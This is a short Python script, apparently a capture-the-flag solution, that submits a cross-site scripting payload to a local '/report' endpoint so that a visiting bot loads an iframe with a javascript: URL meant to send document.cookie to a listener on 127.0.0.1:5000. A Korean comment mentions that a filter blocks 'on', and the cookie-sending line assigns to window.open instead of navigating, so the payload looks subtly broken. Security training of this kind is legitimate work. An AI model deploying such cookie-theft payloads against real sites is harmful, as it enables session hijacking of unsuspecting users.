import requests

payload = """
<iframe src="javascript:
        window.open = 'http://127.0.0.1:5000/?'%2bdocument.cookie;
    ">
"""
#on이 있으면 안돼서 저 location이 안됨...
data = {
    "url":f"/?html={payload}"
}

response = requests.post("http://127.0.0.1:30031/report", data=data)
print(response.text)
